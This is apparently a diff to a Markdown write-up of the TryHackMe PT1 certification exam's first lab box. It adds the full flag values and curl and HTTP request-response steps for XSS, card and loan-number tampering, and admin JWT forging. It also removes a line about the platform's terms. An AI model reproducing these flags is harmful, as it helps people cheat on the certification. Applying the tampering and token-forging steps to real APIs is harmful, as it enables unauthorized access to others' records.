@@ -9,7 +9,7 @@ image:
   path: room_image.png
 ---
 
-> THIS IS NOT DETAIL WRITE UP BUT YOU FEEL LIKE COMPLETE😊 ITS JUST LIKE NOTES I JUST MADE THIS BASED ON TRYHACKME TERMS AND CONDITIONS ! ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND
+> THIS IS NOT DETAIL WRITE UP BUT YOU FEEL LIKE COMPLETE😊ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND
 {: .prompt-tip }
 ## TryHackMe PT1 Certification Overview
 
@@ -95,7 +95,7 @@ SO IT INJECTED LETS GET THE FLAG NOW
 To Get The Flag
 ```console
 $ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "attacker", "password" : "attacker" }' http://10.200.150.100:8080/api/v1.0/xss
-{"flag":"THM{0c8cb256-0c8a-4b59-ac87-***********}","message":"XSS Success"}
+{"flag":"THM{0c8cb256-0c8a-4b59-ac87-1bbb609bef4f}","message":"XSS Success"}
 ```
 Flag-1  Obtained: `THM{0c8cb256-0c8a-4b59-ac87-1bbb609bef4f}`
 
@@ -109,7 +109,7 @@ Now As You Observe In Brup
 ![brup](04.png){: width="1200" height="600"}
 URL Accessed: `http://10.200.150.100:8080/api/v1.0/card`
 In This End Pont You Will Observer There Is An Card Details Try To Edit And Send The Req To The Server 
-![flag](04.png){: width="1200" height="600"}
+![flag](05.png){: width="1200" height="600"}
 ```console
 http://10.200.150.100:8080/api/v1.0/card
 HTTP/1.1 200 OK
@@ -126,7 +126,50 @@ cac-bfab-10d5f55ad360}"},"message":"Card updated"}
 YOU GOT SECOND FLAG 
 Flag 2 Obtained: `THM{727723c6-2fe3-4cac-bfab-10d5f55ad360}`
 
-UPDATING PLEASE WIT..
+Same Process For Third Flag 
 
+End Point You See : `http://10.200.150.100:8080/api/v1.0/loan?loan_number=e086fc22-85ca-4376-a39a739cdc49c23p`
 
+Now Change The Loan Number You Will Get A Flag
+![06](06.png){: width="1200" height="600"}
+```console
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.12.3
+Date: Sat, 07 Jun 2025 15:55:33 GMT
+Content-Type: application/json
+Content-Length: 255
+Access-Control-Allow-Origin: http://10.200.150.100
+Vary: Origin
+Connection: close
+{"details":{"amount":50000,"approved":1,"createdAt":"Sat, 07 Jun 2025 15:52:05
+GMT","description":"i'm goribs","interest":5,"loan_number":"e086fc22-85ca-4376-a39a739cdc49c22f"},"flag":"THM{9c1a8e66-40b5-41fc-8bde-f821865a5a57}","message":"Loan
+updated"}
+```
+YOU GOT THRID FLAG 
+Flag 3 Obtained: `THM{9c1a8e66-40b5-41fc-8bde-f821865a5a57}`
+
+## FINAL FLAG FOR BOX-1
+USER UPDATE 
+GO TO PROFILE CHANGE THE DETAILD CLICK ON UPDATE 
+
+YOU SEE THE BRUP REQ AND NOW CHANGE THE DETAILS TO ADMIN BUT PROBLEM IS YOU NEED TO GET ADMIN `JWT` FOT TO GET THAT TRY YOU TOOLS LIKE JWT TOKEN EDITE ALSO IN ONLINE SOURCE
+
+YOU GET FINAL FLAG 
+![brup](07.png){: width="1200" height="600"}
+
+```console
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.12.3
+Date: Sat, 07 Jun 2025 16:21:35 GMT
+Content-Type: application/json
+Content-Length: 78
+Access-Control-Allow-Origin: http://10.200.150.100
+Vary: Origin
+Connection: close
+THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}
+{"flag":"THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}","message":"User updated"}
+```
+Final Flag Obtained: `THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}`
+
+BOX 1 DONE
 
